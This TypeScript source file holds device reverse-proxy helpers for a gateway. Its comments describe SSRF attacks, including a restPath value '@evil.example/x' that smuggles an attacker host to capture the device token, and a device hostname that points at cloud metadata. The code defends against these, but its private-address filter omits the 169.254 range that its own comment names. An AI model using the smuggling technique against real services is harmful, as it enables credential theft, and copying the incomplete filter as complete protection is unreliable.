/**
 * device-fetch — device reverse-proxy helpers for vale-gate.
 *
 * Holds the pieces of the device module that need to be importable without
 * dragging in all of index.js (keeps index.js ↔ mcp.js imports acyclic).
 */

/**
 * Rebuild a 101 Switching Protocols response carrying the upgraded WebSocket.
 * The old code built `new Response(resp.body, {status:101, headers})` which
 * throws RangeError (101 is only legal with a `webSocket` property), so every
 * WS upgrade through the proxy 500'd. Minimal branch: no header rewriting.
 */
export function build101Response(resp: any) {
  if (resp.status !== 101) return null;
  if (resp.webSocket) {
    try {
      return new Response(null, { status: 101, webSocket: resp.webSocket });
    } catch {
      return resp; // workerd #3047: any repack failure → pass through untouched
    }
  }
  return new Response(resp.body || null, { status: 101, headers: new Headers(resp.headers) });
}

/**
 * Fetch a device panel/MCP path with the Bearer token injected server-side.
 * Shared by proxyDevice (HTTP proxy) and the gateway MCP terminal tools.
 * Behavior is identical to the old inline fetch in proxyDevice (Bearer
 * injection, host/cookie stripped). Returns { status, ok, resp } — resp is
 * undefined when the device is unreachable, with `error` carrying the reason.
 */
import { fetchWithTimeout } from "./reliability.ts";

export async function deviceFetch(_env: any, device: any, restPath: string, init: any = {}) {
  // round-120: SSRF via '@' userinfo — `new URL("https://${hostname}${restPath}")`
  // with restPath = "@evil.example/x" parsed device.hostname as USERINFO and
  // set host = evil.example, then fetched it with the device token + proxy
  // secret attached (the attacker captures both → permanent token = device
  // RCE surviving revoke/TTL). Build the upstream from the hostname field
  // ONLY and reject any restPath that could smuggle a host (userinfo '@',
  // scheme, or a path that re-roots the URL).
  // round-121: narrow the at-sign check to the AUTHORITY-RELEVANT prefix
  // (up to the first / ? or #) — an at-sign in a query string is legitimate
  // (?user=a@b.com) and the hostname-equality check below already blocks
  // userinfo smuggling. A leading scheme in the authority is still rejected.
  const authorityPrefix = restPath.split(/[/?#]/, 1)[0]!;
  if (authorityPrefix.includes("@") || /^[a-z][a-z0-9+.-]*:/i.test(authorityPrefix)) {
    return { status: 400, ok: false, resp: undefined, error: "invalid proxy path" };
  }
  const upstream = new URL(
    `https://${device.hostname}${restPath.startsWith("/") ? restPath : "/" + restPath}`,
  );
  // Belt-and-suspenders: whatever the parser produced, the host MUST be the
  // device's own hostname (never attacker-controlled).
  // round-121: case-insensitive — WHATWG lowercases special-scheme hosts but
  // device registration allows (and stores verbatim) uppercase hostnames.
  if (upstream.hostname.toLowerCase() !== String(device.hostname).toLowerCase()) {
    return { status: 400, ok: false, resp: undefined, error: "invalid proxy path" };
  }
  // stage-n SSRF audit (HIGH): reject private/link-local/internal IPs — an
  // attacker who registers a device with hostname "169.254.169.254" (cloud
  // metadata) or "127.0.0.1" makes the gateway dial it with the device token.
  const hostLower = upstream.hostname.toLowerCase();
  if (
    hostLower === "localhost" ||
    hostLower.startsWith("127.") ||
    hostLower.startsWith("10.") ||
    hostLower.startsWith("192.168.") ||
    hostLower.startsWith("172.") ||
    hostLower === "::1" ||
    hostLower.startsWith("fc") ||
    hostLower.startsWith("fd") ||
    hostLower.startsWith("fe80")
  ) {
    return {
      status: 400,
      ok: false,
      resp: undefined,
      error: "device hostname resolves to a private/internal address",
    };
  }
  const headers = new Headers(init.headers || {});
  headers.delete("host");
  headers.delete("cookie");
  headers.set("Authorization", `Bearer ${device.token}`);
  let resp;
  try {
    // Read methods are bounded (round-55): a blackholed tunnel hung until
    // the platform's subrequest ceiling. round-56: the bound applies to
    // EVERY non-POST method. POST is bounded at 60 s (stage-n MEDIUM: the
    // old unbounded POST was a slow-loris vector on blackholed tunnels;
    // idempotency is the caller's concern — they can always retry).
    resp = await fetchWithTimeout(upstream.toString(), { ...init, headers }, init.method === "POST" ? 60000 : 15000);
  } catch (e) {
    return { status: 502, ok: false, error: `Device unreachable: ${(e as Error).message}` };
  }
  return { status: resp.status, ok: resp.ok, resp };
}
